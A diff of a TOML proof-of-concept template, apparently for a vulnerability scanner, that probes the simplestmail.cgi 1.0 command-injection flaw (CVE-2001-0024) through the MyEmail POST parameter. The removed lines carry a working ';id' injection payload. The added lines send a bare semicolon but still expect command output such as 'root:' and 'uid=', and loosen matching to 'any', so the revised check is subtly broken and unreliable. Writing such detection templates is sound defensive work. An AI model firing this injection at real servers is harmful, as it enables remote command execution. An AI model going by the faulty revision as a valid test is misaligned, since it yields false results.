@@ -1,17 +1,21 @@
 [info]
 author = "AVE"
-description = "simplestmail.cgi 1.0 未对 MyEmail 参数进行过滤，攻击者可通过 POST 请求注入 shell 元字符（如 ;）实现远程命令执行。发送 MyEmail=;id 并匹配响应中的 uid= 字符串即可验证。"
+description = "通过向 simplestmail.cgi 发送 POST 请求，在 MyEmail 参数中注入 Shell 元字符（分号），触发 CGI 脚本执行任意系统命令。验证方式为发送包含命令注入的请求并检测响应中是否包含命令执行结果。"
 id = "POC-AVE-2001-0011"
 name = "Leif M. Wright simplestmail.cgi 1.0 Remote Command Execution PoC"
-severity = "high"
-tags = ["ave-2001-0011"]
+severity = "critical"
+tags = [
+    "cve-2001-0024",
+    "rce",
+    "cgi",
+]
 vuln_id = [
     "CVE-2001-0024",
     "AVE-2001-0011",
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "POST"
@@ -19,7 +23,7 @@ path = "/{{BaseURL}}/cgi-bin/simplestmail.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "MyEmail=%3Bid&redirect=http%3A%2F%2Fexample.com&submit=run"
+content = "MyEmail=%3B&redirect=http%3A%2F%2Fexample.com&submit=run"
 type = "raw"
 
 [poc.requests.headers]
@@ -29,4 +33,8 @@ Content-Type = "application/x-www-form-urlencoded"
 expect = true
 part = "body"
 type = "word"
-words = ["uid="]
+words = [
+    "root:",
+    "uid=",
+    "bin/",
+]
